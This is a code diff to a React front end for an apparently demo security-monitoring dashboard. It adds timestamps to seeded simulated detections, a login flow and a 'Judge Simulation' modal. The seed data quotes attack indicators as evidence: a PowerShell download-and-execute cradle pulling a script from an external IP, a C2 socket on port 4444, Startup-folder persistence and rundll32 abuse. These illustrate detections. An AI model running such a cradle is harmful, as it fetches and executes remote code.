@@ -56,6 +56,7 @@ import { DashboardPage } from '@/pages/dashboard-page';
 import LabPage from '@/pages/lab-page';
 import { useQuarantine } from '@/hooks/use-quarantine';
 import { useReports } from '@/hooks/use-reports';
+import { JudgeSimulationModal } from '@/components/judge-simulation-modal';
 
 const queryClient = new QueryClient();
 
@@ -71,7 +72,7 @@ type Threat = {
 type FileRecord = { id: string; timestamp: string; process: string; path: string; operation: string; classification: string; risk: Severity };
 type Connection = { id: string; process: string; local: string; destination: string; domain: string; port: number; protocol: string; time: string; bytes: string; frequency: string; risk: Severity; location: string };
 type TimelineEvent = { id: string; time: string; title: string; detail: string; category: string; status: EvidenceStatus };
-type QuarantineItem = { id: string; name: string; path: string; date: string; source: string; hash: string; status: string; threatId?: string };
+type QuarantineItem = { id: string; name: string; path: string; date: string; source: string; hash: string; status: string; threatId?: string; quarantineReason?: string; severity?: Severity };
 
 const threatsSeed: Threat[] = [
   { id: 'thr-1', name: 'Suspicious PowerShell execution', severity: 'critical', className: 'Command & Control', timestamp: 'Today, 09:42:18', path: 'C:\\Users\\mira\\AppData\\Local\\Temp\\ps_8F2A.ps1', process: 'powershell.exe', hash: 'a7f1c82e9d04b6f1e3aa92c4', reason: 'Encoded command reached an uncommon external destination', status: 'detected' },
@@ -310,9 +311,10 @@ const simulatedDetectionsSeed: Detection[] = [
     username: 'SYSTEM',
     hostname: 'WS-0427',
     timestamp: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
+    event_timestamp: new Date(Date.now() - 14 * 60 * 1000).toISOString(),
     evidence: [
       { key: 'encoded_marker', description: 'Base64 encoded parameter (-enc) detected in command line invocation', source: 'command_line', detail: '-enc SQBFAFgAKABOAGUAdwAt...' },
-      { key: 'decoded_cradle', description: 'Decodes to IEX (New-Object Net.WebClient).DownloadString(\'http://45.154.255.88:8080/b.ps1\')', source: 'deobfuscation', detail: 'External C2 staging endpoint' },
+      { key: 'decoded_cradle', description: 'Decodes to IEX (New-Object Net.WebClient).DownloadString(\'http://45.154.255.88:8080/b.ps1\')', source: 'command_line', detail: 'External C2 staging endpoint' },
     ],
     correlated_rules: ['PROC-001-SUSPICIOUS-PARENT-CHILD', 'PROC-002-ENCODED-COMMAND-LINE', 'PROC-006-DOWNLOAD-EXECUTE'],
     ancestry: [
@@ -340,6 +342,7 @@ const simulatedDetectionsSeed: Detection[] = [
     username: 'analyst',
     hostname: 'WS-0427',
     timestamp: new Date(Date.now() - 10 * 60 * 1000).toISOString(),
+    event_timestamp: new Date(Date.now() - 10 * 60 * 1000).toISOString(),
     evidence: [
       { key: 'writable_path', description: 'Binary executes from user-writable Temp directory', source: 'path', detail: 'C:\\Users\\nikhi\\AppData\\Local\\Temp\\svchost_update.exe' },
       { key: 'c2_socket', description: 'Established TCP socket to 45.154.255.88:4444', source: 'network', detail: '10.102.49.157:51280 -> 45.154.255.88:4444 (ESTABLISHED)' }
@@ -369,9 +372,10 @@ const simulatedDetectionsSeed: Detection[] = [
     username: 'analyst',
     hostname: 'WS-0427',
     timestamp: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
+    event_timestamp: new Date(Date.now() - 6 * 60 * 1000).toISOString(),
     evidence: [
-      { key: 'startup_location', description: 'File placed in per-user Startup directory', source: 'filesystem', detail: 'C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' },
-      { key: 'auto_execution', description: 'Batch script executes automatically upon user authentication', source: 'persistence', detail: 'Calls dropped payload svchost_update.exe' }
+      { key: 'startup_location', description: 'File placed in per-user Startup directory', source: 'path', detail: 'C:\\Users\\nikhi\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\' },
+      { key: 'auto_execution', description: 'Batch script executes automatically upon user authentication', source: 'path', detail: 'Calls dropped payload svchost_update.exe' }
     ],
     correlated_rules: ['FILE-001-STARTUP-PERSISTENCE'],
     ancestry: []
@@ -395,6 +399,7 @@ const simulatedDetectionsSeed: Detection[] = [
     username: 'analyst',
     hostname: 'WS-0427',
     timestamp: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
+    event_timestamp: new Date(Date.now() - 3 * 60 * 1000).toISOString(),
     evidence: [
       { key: 'lolbin_invocation', description: 'rundll32.exe invoked with temp DLL target', source: 'command_line', detail: 'rundll32.exe ... update.dll,#1' }
     ],
@@ -931,6 +936,7 @@ function AppContent() {
   const { items: quarantine, setItems: setQuarantine } = quarantineManager;
   const reportsManager = useReports();
   const [cyberCellSubmitted, setCyberCellSubmitted] = useState(false);
+  const [judgeSimOpen, setJudgeSimOpen] = useState(false);
   const [modal, setModal] = useState<ModalState>(null);
   const [toasts, setToasts] = useState<Array<{ id: number; title: string; body: string }>>([]);
 
@@ -1042,8 +1048,8 @@ function AppContent() {
     setAuthMode('login');
     setMobileOpen(false);
     setModal(null);
-    setLocation('/activate');
-    toast('Deactivated', 'ARGUS session deactivated.');
+    setLocation('/login');
+    toast('Signed out', 'Session cleared. Incident demo state is preserved for the next sign-in.');
   };
 
   useEffect(() => {
@@ -1110,7 +1116,24 @@ function AppContent() {
 
   const toastStack = <div className="toast-stack">{toasts.map((t) => <div className="toast" key={t.id} data-testid={`toast-${t.id}`}><strong>{t.title}</strong><p>{t.body}</p></div>)}</div>;
 
-  if (!session || location === '/login' || location === '/activate') {
+  if (location === '/login') {
+    return <>
+      <AuthScreen
+        onAuthed={(name) => {
+          setUserName(name.trim() || 'Analyst');
+          setSession(true);
+          setLocation('/dashboard');
+          toast(`Welcome, ${name.trim() || 'Analyst'}`, 'ARGUS workspace ready.');
+        }}
+        onSwitch={setAuthMode}
+        mode={authMode}
+        initialName={userName}
+      />
+      {toastStack}
+    </>;
+  }
+
+  if (!session || location === '/activate') {
     return <>
       <ActivationScreen
         onActivated={() => {
@@ -1124,8 +1147,81 @@ function AppContent() {
     </>;
   }
 
-      return <div className="argus-shell"><Sidebar location={location} open={mobileOpen} onClose={() => setMobileOpen(false)} onLogout={logout} userName={userName} monitorConnected={processMonitor.connected} threatCount={threatAnalysis.threatCount} detectionCount={detections.detections.length} /><div className="main-wrap">      <header className="topbar"><div style={{ display: 'flex', alignItems: 'center', gap: 12 }}><button className="btn btn-ghost mobile-only" style={{ padding: 5 }} onClick={() => setMobileOpen(true)} data-testid="button-open-nav"><Menu size={18} /></button><div><div style={{ fontSize: 11, fontWeight: 700 }}>Security intelligence workspace</div><div className="mono muted" style={{ marginTop: 2 }}>Northstar / {location.slice(1).replace('-', ' ')}{demoState !== 'idle' ? ` · demo ${demoState}` : ''}{processMonitor.hasData ? ' · live' : ''}</div></div></div>{autoDemo.state.demoMode && <AutonomousDemoPill demo={autoDemo.state} onStop={stopDemo} />}<div style={{ display: 'flex', gap: 15, alignItems: 'center' }}><EvidenceLegend /><div style={{ height: 22, borderLeft: '1px solid hsl(var(--border))' }} /><button className="btn btn-ghost" style={{ padding: 5 }} onClick={() => toast('No new alerts', 'The sensor network has no unread notifications.')} data-testid="button-notifications"><Bell size={15} /></button><div className="avatar" style={{ width: 26, height: 26 }}>{userName.trim().split(/\s+/).map((p) => p[0] || '').slice(0, 2).join('').toUpperCase() || 'MA'}</div></div></header><main className="content"><div className="route-container" key={location} data-testid="route-view">{page}</div></main></div>{modal && <div className="modal-backdrop" role="presentation"><div className="modal"><div className="eyebrow">Confirm action</div><h2>{modal.title}</h2><p>{modal.body}</p><div className="modal-actions"><Button onClick={() => setModal(null)} testId="button-cancel-confirmation">Cancel</Button><Button kind={modal.danger ? 'danger' : 'primary'} onClick={() => { modal.onConfirm(); setModal(null); }} testId="button-confirm-action">{modal.confirm}</Button></div></div></div>}{toastStack}</div>;
-}
+      return (
+        <div className="argus-shell">
+          <Sidebar location={location} open={mobileOpen} onClose={() => setMobileOpen(false)} onLogout={logout} userName={userName} monitorConnected={processMonitor.connected} threatCount={threatAnalysis.threatCount} detectionCount={detections.detections.length} />
+          <div className="main-wrap">
+            <header className="topbar">
+              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
+                <button className="btn btn-ghost mobile-only" style={{ padding: 5 }} onClick={() => setMobileOpen(true)} data-testid="button-open-nav">
+                  <Menu size={18} />
+                </button>
+                <div>
+                  <div style={{ fontSize: 11, fontWeight: 700 }}>Security intelligence workspace</div>
+                  <div className="mono muted" style={{ marginTop: 2 }}>Northstar / {location.slice(1).replace('-', ' ')}{demoState !== 'idle' ? ` · demo ${demoState}` : ''}{processMonitor.hasData ? ' · live' : ''}</div>
+                </div>
+              </div>
+              {autoDemo.state.demoMode && <AutonomousDemoPill demo={autoDemo.state} onStop={stopDemo} />}
+              <div style={{ display: 'flex', gap: 12, alignItems: 'center' }}>
+                <button
+                  type="button"
+                  className="btn btn-primary"
+                  style={{
+                    background: 'linear-gradient(135deg, #eab308 0%, #f97316 100%)',
+                    color: '#000',
+                    fontWeight: 800,
+                    fontSize: '11px',
+                    gap: '6px',
+                    padding: '6px 14px',
+                    boxShadow: '0 0 12px rgba(234, 179, 8, 0.4)',
+                    border: 'none',
+                    borderRadius: '6px'
+                  }}
+                  onClick={() => setJudgeSimOpen(true)}
+                  data-testid="button-run-judge-sim"
+                >
+                  <Zap size={14} /> ⚡ Run Judge Simulation
+                </button>
+                <EvidenceLegend />
+                <div style={{ height: 22, borderLeft: '1px solid hsl(var(--border))' }} />
+                <button className="btn btn-ghost" style={{ padding: 5 }} onClick={() => toast('No new alerts', 'The sensor network has no unread notifications.')} data-testid="button-notifications">
+                  <Bell size={15} />
+                </button>
+                <div className="avatar" style={{ width: 26, height: 26 }}>
+                  {userName.trim().split(/\s+/).map((p) => p[0] || '').slice(0, 2).join('').toUpperCase() || 'MA'}
+                </div>
+              </div>
+            </header>
+            <main className="content">
+              <div className="route-container" key={location} data-testid="route-view">
+                {page}
+              </div>
+            </main>
+          </div>
+          {modal && (
+            <div className="modal-backdrop" role="presentation">
+              <div className="modal">
+                <div className="eyebrow">Confirm action</div>
+                <h2>{modal.title}</h2>
+                <p>{modal.body}</p>
+                <div className="modal-actions">
+                  <Button onClick={() => setModal(null)} testId="button-cancel-confirmation">Cancel</Button>
+                  <Button kind={modal.danger ? 'danger' : 'primary'} onClick={() => { modal.onConfirm(); setModal(null); }} testId="button-confirm-action">{modal.confirm}</Button>
+                </div>
+              </div>
+            </div>
+          )}
+          <JudgeSimulationModal
+            isOpen={judgeSimOpen}
+            onClose={() => setJudgeSimOpen(false)}
+            toast={toast}
+            onNavigate={setLocation}
+          />
+          {toastStack}
+        </div>
+      );
+    }
+
 
 function App() {
   return <QueryClientProvider client={queryClient}><TooltipProvider><WouterRouter base={import.meta.env.BASE_URL.replace(/\/$/, '')}><ErrorBoundary resetKey={window.location.pathname}><AppContent /></ErrorBoundary></WouterRouter><Toaster /></TooltipProvider></QueryClientProvider>;
